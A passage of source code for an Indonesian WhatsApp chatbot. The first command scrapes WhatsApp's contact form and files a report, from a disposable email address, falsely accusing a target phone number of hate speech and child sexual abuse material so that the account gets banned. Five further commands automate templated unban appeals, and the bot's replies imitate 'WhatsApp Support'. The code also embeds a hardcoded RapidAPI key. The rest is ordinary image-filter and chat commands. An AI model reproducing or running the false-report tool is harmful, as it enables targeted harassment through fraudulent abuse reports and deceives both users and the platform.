  let ceknya = await Aira.onWhatsApp(prrkek)
  if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
  let axioss = require("axios")  
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
  let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
  let cookie = ntah.headers["set-cookie"].join("; ")
  const cheerio = require('cheerio');
  let $ = cheerio.load(ntah.data)
  let $form = $("form");
  let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
  let form = new URLSearchParams()
  form.append("jazoest", $form.find("input[name=jazoest]").val())
  form.append("lsd", $form.find("input[name=lsd]").val())
  form.append("step", "submit")
  form.append("country_selector", "INDONESIA")
  form.append("phone_number", prrkek)
  form.append("email", email.data[0])
  form.append("email_confirm", email.data[0])
  form.append("platform", "ANDROID")
  form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
  form.append("__user", "0")
  form.append("__a", "1")
  form.append("__csr", "")
  form.append("__req", "8")
  form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
  form.append("dpr", "1")
  form.append("__ccg", "UNKNOWN")
  form.append("__rev", "1006630858")
  form.append("__comment_req", "0")
  let res = await axioss({
    url,
    method: "POST",
    data: form,
    headers: {
    cookie
  }
  })
  await loading()
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
  }
  break
  case "unbannedv1": {
  if (!isCreator && !isPremium) return reply(mess.OnlyPrem)
  if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
  prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
  let ceknya = await Aira.onWhatsApp(prrkek)
  if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
  let axioss = require("axios")  
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
  let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
  let cookie = ntah.headers["set-cookie"].join("; ")
  const cheerio = require('cheerio');
  let $ = cheerio.load(ntah.data)
  let $form = $("form");
  let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
  let form = new URLSearchParams()
  form.append("jazoest", $form.find("input[name=jazoest]").val())
  form.append("lsd", $form.find("input[name=lsd]").val())
  form.append("step", "submit")
  form.append("country_selector", "INDONESIA")
  form.append("phone_number", prrkek)
  form.append("email", email.data[0])
  form.append("email_confirm", email.data[0])
  form.append("platform", "ANDROID")
  form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
  form.append("__user", "0")
  form.append("__a", "1")
  form.append("__csr", "")
  form.append("__req", "8")
  form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
  form.append("dpr", "1")
  form.append("__ccg", "UNKNOWN")
  form.append("__rev", "1006630858")
  form.append("__comment_req", "0")
  let res = await axioss({
    url,
    method: "POST",
    data: form,
    headers: {
    cookie
  }
  })
  await loading()
  let payload = String(res.data)
  if (payload.includes(`"payload":true`)) {
  reply(`##- WhatsApp Support -##
  
  Halo,
  
  Terima kasih telah menghubungi kami.
  
  Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.
  
  Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.
  
  Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk
  
  mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
  } else if (payload.includes(`"payload":false`)) {
  reply(`##- WhatsApp Support -##
  
  Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
  } else reply(util.format(res.data))
    }
  break
  case "unbannedv2": {
  if (!isCreator && !isPremium) return reply(mess.OnlyPrem)
  if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
  prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
  let ceknya = await Aira.onWhatsApp(prrkek)
  if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
  let axioss = require("axios")  
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
  let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
  let cookie = ntah.headers["set-cookie"].join("; ")
  const cheerio = require('cheerio');
  let $ = cheerio.load(ntah.data)
  let $form = $("form");
  let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
  let form = new URLSearchParams()
  form.append("jazoest", $form.find("input[name=jazoest]").val())
  form.append("lsd", $form.find("input[name=lsd]").val())
  form.append("step", "submit")
  form.append("country_selector", "INDONESIA")
  form.append("phone_number", prrkek)
  form.append("email", email.data[0])
  form.append("email_confirm", email.data[0])
  form.append("platform", "ANDROID")
  form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
  form.append("__user", "0")
  form.append("__a", "1")
  form.append("__csr", "")
  form.append("__req", "8")
  form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
  form.append("dpr", "1")
  form.append("__ccg", "UNKNOWN")
  form.append("__rev", "1006630858")
  form.append("__comment_req", "0")
  let res = await axioss({
    url,
    method: "POST",
    data: form,
    headers: {
    cookie
  }
  })
  await loading()
  let payload = String(res.data)
  if (payload.includes(`"payload":true`)) {
  reply(`##- WhatsApp Support -##
  
  Halo,
  
  Terima kasih telah menghubungi kami.
  
  Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.
  
  Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.
  
  Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk
  
  mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
  } else if (payload.includes(`"payload":false`)) {
  reply(`##- WhatsApp Support -##
  
  Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
  } else reply(util.format(res.data))
    }
  break
  case "unbannedv3": {
  if (!isCreator && !isPremium) return reply(mess.OnlyPrem)
  if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
  prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
  let ceknya = await Aira.onWhatsApp(prrkek)
  if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
  let axioss = require("axios")  
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
  let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
  let cookie = ntah.headers["set-cookie"].join("; ")
  const cheerio = require('cheerio');
  let $ = cheerio.load(ntah.data)
  let $form = $("form");
  let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
  let form = new URLSearchParams()
  form.append("jazoest", $form.find("input[name=jazoest]").val())
  form.append("lsd", $form.find("input[name=lsd]").val())
  form.append("step", "submit")
  form.append("country_selector", "INDONESIA")
  form.append("phone_number", prrkek)
  form.append("email", email.data[0])
  form.append("email_confirm", email.data[0])
  form.append("platform", "ANDROID")
  form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
  form.append("__user", "0")
  form.append("__a", "1")
  form.append("__csr", "")
  form.append("__req", "8")
  form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
  form.append("dpr", "1")
  form.append("__ccg", "UNKNOWN")
  form.append("__rev", "1006630858")
  form.append("__comment_req", "0")
  let res = await axioss({
    url,
    method: "POST",
    data: form,
    headers: {
    cookie
  }
  })
  await loading()
  let payload = String(res.data)
  if (payload.includes(`"payload":true`)) {
  reply(`##- WhatsApp Support -##
  
  Halo,
  
  Terima kasih telah menghubungi kami.
  
  Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.
  
  Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.
  
  Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk
  
  mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
  } else if (payload.includes(`"payload":false`)) {
  reply(`##- WhatsApp Support -##
  
  Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
  } else reply(util.format(res.data))
    }
  break
  case "unbannedv4": {
  if (!isCreator && !isPremium) return reply(mess.OnlyPrem)
  if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
  prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
  let ceknya = await Aira.onWhatsApp(prrkek)
  if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
  let axioss = require("axios")  
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
  let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
  let cookie = ntah.headers["set-cookie"].join("; ")
  const cheerio = require('cheerio');
  let $ = cheerio.load(ntah.data)
  let $form = $("form");
  let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
  let form = new URLSearchParams()
  form.append("jazoest", $form.find("input[name=jazoest]").val())
  form.append("lsd", $form.find("input[name=lsd]").val())
  form.append("step", "submit")
  form.append("country_selector", "INDONESIA")
  form.append("phone_number", prrkek)
  form.append("email", email.data[0])
  form.append("email_confirm", email.data[0])
  form.append("platform", "ANDROID")
  form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
  form.append("__user", "0")
  form.append("__a", "1")
  form.append("__csr", "")
  form.append("__req", "8")
  form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
  form.append("dpr", "1")
  form.append("__ccg", "UNKNOWN")
  form.append("__rev", "1006630858")
  form.append("__comment_req", "0")
  let res = await axioss({
    url,
    method: "POST",
    data: form,
    headers: {
    cookie
  }
  })
  await loading()
  let payload = String(res.data)
  if (payload.includes(`"payload":true`)) {
  reply(`##- WhatsApp Support -##
  
  Halo,
  
  Terima kasih telah menghubungi kami.
  
  Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.
  
  Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.
  
  Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk
  
  mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
  } else if (payload.includes(`"payload":false`)) {
  reply(`##- WhatsApp Support -##
  
  Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
  } else reply(util.format(res.data))
    }
  break
  case "unbannedv5": {
  if (!isCreator && !isPremium) return reply(mess.OnlyPrem)
  if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
  prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
  let ceknya = await Aira.onWhatsApp(prrkek)
  if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
  let axioss = require("axios")  
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
  let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
  let cookie = ntah.headers["set-cookie"].join("; ")
  const cheerio = require('cheerio');
  let $ = cheerio.load(ntah.data)
  let $form = $("form");
  let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
  let form = new URLSearchParams()
  form.append("jazoest", $form.find("input[name=jazoest]").val())
  form.append("lsd", $form.find("input[name=lsd]").val())
  form.append("step", "submit")
  form.append("country_selector", "INDONESIA")
  form.append("phone_number", prrkek)
  form.append("email", email.data[0])
  form.append("email_confirm", email.data[0])
  form.append("platform", "ANDROID")
  form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
  form.append("__user", "0")
  form.append("__a", "1")
  form.append("__csr", "")
  form.append("__req", "8")
  form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
  form.append("dpr", "1")
  form.append("__ccg", "UNKNOWN")
  form.append("__rev", "1006630858")
  form.append("__comment_req", "0")
  let res = await axioss({
    url,
    method: "POST",
    data: form,
    headers: {
    cookie
  }
  })
  await loading()
  let payload = String(res.data)
  if (payload.includes(`"payload":true`)) {
  reply(`##- WhatsApp Support -##
  
  Halo,
  
  Terima kasih telah menghubungi kami.
  
  Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.
  
  Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.
  
  Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk
  
  mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
  } else if (payload.includes(`"payload":false`)) {
  reply(`##- WhatsApp Support -##
  
  Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
  } else reply(util.format(res.data))
    }
  break
  


case 'intro':{
var intro =`0ཻུ۪۪ꦽꦼ̷⸙‹•══════════════♡᭄
│       *「 Kartu Intro 」*
│ *Nama   :* 
│ *Gender :* 
│ *Umur   :* 
│ *Hobby  :* 
│ *Kelas  :* 
│ *Asal   :* 
│ *Agama  :* 
| *Status :* 
╰═════ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙
`
Aira.sendMessage(m.chat, {text: intro }, {quoted: fkontak})
}
break
case 'videocallsex': case 'vcs':{
newReply('Dasar sangean sange kok sama program')
await delay(1500)
newReply('GAWARAS')}
break
case 'tes': case 'test':{
addCountCmd('#tes', m.sender, _cmd)
Aira.sendMessage(m.chat, {text: `${setting.botName} is _Online_\n*Runtime :* ${runtime(process.uptime())}`}, {quoted: fkontak})}
break
case 'bot': case 'simi':{
if (!q) return newReply('Iya Kak?')
let levelnya=[1,2,3,4,5,6,7,8]
let level=levelnya[Math.floor(Math.random() * levelnya.length)]
let simi = await fetchJson(`https://skizo.tech/api/simi?apikey=${setting.XznKey}&text=${q}&level=${level}`)
const simi2 = simi.result
Aira.sendMessage(m.chat, {text: simi2}, {quoted: m})}
break
case 'bokep': {
const fs = require('fs');
if (!m.isGroup)return newReply(mess.OnlyGrup)
//await newReply(mess.wait)
let istighfar = fs.readFileSync('./media/Astaghfirullah.mp4')
let ban = m.mentionedJid[0] || m.sender || Aira.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
await Aira.sendFile(ban, istighfar, 'astagfirullah.mp4', `Tobat Broo:v`, m)
await newReply(`Silahkan Cek Di Private Chat:v`) 
}
break
case 'listbahasa':{
addCountCmd('#listbahasa', m.sender, _cmd)
var clear = ["auto", "isSupported", "getCode"]
var teks = `List Bahasa Yang Tersedia\n\n`
for (let i in translate.languages) {
if (!clear.includes(i)) {
teks += `*${i}* untuk ${translate.languages[i]}\n`
}
}
newReply(teks)}
break
case 'differentme': {
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply('Proses Ayangg')
try{
const media = await Aira.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
const img = await fetch (`https://skizo.tech/api/aimirror?&apikey=${setting.XznKey}&url=${anu}&filter=${text}`) 
const p = await img.json()
if (p.status !== 200) throw 'Mana gakada'
const imgs = p.generated_image_addresses
const capt = p.time_processing
Aira.sendMessage(m.chat, { image: { url: imgs }, caption: `Done Bruh\nWaktu Selesai ${capt}`}, { quoted: m})
}catch (error) {
newReply(`Masukkan Nama Filter Yang Valid!\nList Filter :\n- anime_2d\n- cartoon_3d\n- pretty_soldier\n- bizarre\n- romance_comic\n- maid_dressing\n- superhero_comic\n- watercolor\n- doodle\n- america_comic\n- starry_girl`)
}
}
break
case 'differentme2': {
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply('Proses Ayangg')
try{
const media = await Aira.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
const img = await fetch (`https://skizo.tech/api/aimirrorvip?&apikey=${setting.XznKey}&url=${anu}&filter=${text}`) 
const p = await img.json()
if (p.status !== 200) throw 'Mana gakada'
const imgs = p.generated_image_addresses
const capt = p.time_processing
Aira.sendMessage(m.chat, { image: { url: imgs }, caption: `Done Bruh\nWaktu Selesai ${capt}`}, { quoted: m})
}catch (error) {
newReply(`Masukkan Nama Filter Yang Valid!\nList Filter :\n- gta5\n- dball\n- naruto\n- cyber\n- killer\n- kyoto\n- bikini\n- iron`)
}
}
break

case 'deepfake':{
if (!isCreator) return newReply('ga mw')
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)
}
break
case 'difusi':{
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!text) throw `Masukkan Model Dan Prompt contoh: ${prefix}${command}anything-v5|A beautiful rich women in the kitchen\n\n untuk melihat model yang tersedia silahkan ketik ${prefix}modellist`
let model=text.split('|')[0];
let prompt=text.split('|')[1];
if (!model||!prompt) throw `Masukkan Model Dan Prompt contoh: ${prefix}${command}anything-v5|A beautiful rich women in the kitchen\n\n untuk melihat model yang tersedia silahkan ketik ${prefix}modellist`
m.reply(mess.wait)
const options = {
  method: 'POST',
  url: 'https://animimagine-ai.p.rapidapi.com/generateImage',
  headers: {
    'content-type': 'application/json',
    'Content-Type': 'application/json',
    'X-RapidAPI-Key': 'bb8eb3a232msh8a373e18f5c99ccp1f7096jsne36049c70288',
    'X-RapidAPI-Host': 'animimagine-ai.p.rapidapi.com'
  },
  data: {
    selected_model_id: model,
    selected_model_bsize: '512',
    prompt: prompt
  }
};
try {
const response = await axios.request(options);
console.log(response.data.imageUrl)
Aira.sendMessage(m.chat, {image: { url: response.data.imageUrl}, caption: `Prompt: ${prompt}\n Models: ${model}`},{quoted: m})
     } catch (e) {
m.reply(e)
}
}
break
case 'modellist':{
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
m.reply(mess.wait)
const axios = require('axios');

const options = {
  method: 'GET',
  url: 'https://animimagine-ai.p.rapidapi.com/fetchModels',
  headers: {
    'X-RapidAPI-Key': 'bb8eb3a232msh8a373e18f5c99ccp1f7096jsne36049c70288',
    'X-RapidAPI-Host': 'animimagine-ai.p.rapidapi.com'
  }
};

try {
const response = await axios.request(options);
console.log(response)
console.log(response.data.length)
let teks = '';
let ress = response.data.models;
for (let g of ress) {
teks += `• *Nama Model* : ${g.id}\n`;
teks += `• *deskripsi* : ${g.description}\n`;
teks += `• *Status* : ${g.status}\n`;
teks += `• *Nsfw* : ${g.is_nsfw}\n`;
teks += `• *Sample image* : ${g.image_url}\n\n────────────────────\n\n`;
}
newReply(teks)
     } catch (e) {
m.reply(e)
}
}
break



case 'diffusion': case 'stabledif': case 'diff':{
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!text) throw `Masukan Promptnya\nExample:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`
m.reply(mess.wait)
try {
let anu = await diff(text)
console.log(anu)
let hasil = await processing(anu, "enhance");
console.log(hasil)
Aira.sendFile(m.chat, hasil, 'anu.jpg', `Prompt: ${text}`, m)
     } catch (e) {
m.reply(eror)
}
}
break

case 'diffusion2': case 'stabledif2': case 'diff2':{
  if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
  if (!text) throw `Masukan Promptnya\nExample:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`
  m.reply(mess.wait)
  try {
  let anu = await diff2(text)
  let hasil = await processing(anu, "enhance");
  Aira.sendFile(m.chat, hasil, 'anu.jpg', `Prompt: ${text}`, m)
       } catch (e) {
  m.reply(eror)
  }
  }
  break
  
case 'txt2img':{
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!text) throw 'Masukan Promptnya\nExample:\n1girl, with glasses, in beach'
newReply(`Proses Ayang`)
try {
let txt = await getBuffer(`https://skizo.tech/api/txt2img?text=${text}&apikey=${setting.XznKey}`)
await Aira.sendMessage(m.chat, {image: txt, caption: `Done Sayang`},{quoted: m})
     } catch (e) {
newReply('Gagal Convert Gambar') 
}
}
break
case 'aiscene': {
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply('Proses')
const media = await Aira.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
Aira.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/aiscene?url=${anu}&apikey=${setting.XznKey}` }, caption: 'Done Bruh Kalo Jelek Maapin Ya:<'}, { quoted: m})
}
break
case 'toanime': case 'jadianime': {
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply('Proses Ayangg')
const media = await Aira.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
Aira.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/toanime?url=${anu}&apikey=${setting.XznKey}` }, caption: 'Done Jadi Anime Ayangg >///<'}, { quoted: m})
}
break
case 'toanime2': case 'jadianime2': {
  if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
  if (!quoted) return newReply(`Fotonya Mana?`)
  if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
  newReply('Proses Ayangg')
  const media = await Aira.downloadAndSaveMediaMessage(quoted)
  const anu = await TelegraPH(media)
  const anime = require('selfietoanime');

anime.transform({
    photo: `${anu}`,
    // To save the image to a specific path
    destinyFolder: './media'
})
.then(data => {
    console.log('Image', data);
    Aira.sendMessage(m.chat, { image: { url: data }, caption: 'Done Jadi Anime Ayangg >///<'}, { quoted: m})
})
.catch(err => {
    console.log('Error', err);
});
}
break
case 'toanime3': case 'jadianime3': {
  if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
  if (!quoted) return newReply(`Fotonya Mana?`)
  if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
  newReply('Proses Ayangg')
  const media = await Aira.downloadAndSaveMediaMessage(quoted)
  const anu = await TelegraPH(media)
  const photo2anime = require('photo2anime');
const anime = new photo2anime();

anime.on('ready', () => {
    anime.transform({
      photo: `${anu}`,
        // To save the image to a specific path
        destinyFolder: './media'
    })
    .then(data => {
        console.log('Image', data);
        Aira.sendMessage(m.chat, { image: { url: data }, caption: 'Done Jadi Anime Ayangg >///<'}, { quoted: m})
    })
    .catch(err => {
        console.log('Error', err);
    })
})

}
break

case 'tozombie': case 'jadizombie': {
  if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
  if (!quoted) return newReply(`Fotonya Mana?`)
  if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
  newReply('Proses Ayangg')
  const media = await Aira.downloadAndSaveMediaMessage(quoted)
  const anu = await TelegraPH(media)
  const makemeazombie = require('makemeazombie');
const zombie = new makemeazombie();

zombie.transform({
    photo: `${anu}`,
    // To save the image to a specific path
    destinyFolder: './media'
})
.then(data => {
    console.log('Image', data);
    Aira.sendMessage(m.chat, { image: { url: data }, caption: 'Iihhh Seereeemmm >///<'}, { quoted: m})
})
.catch(err => {
    console.log('Error', err);
})
  }
break

case 'nobg': case 'removebg':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!quoted) return newReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return newReply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
newReply(mess.wait)
const media = await Aira.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
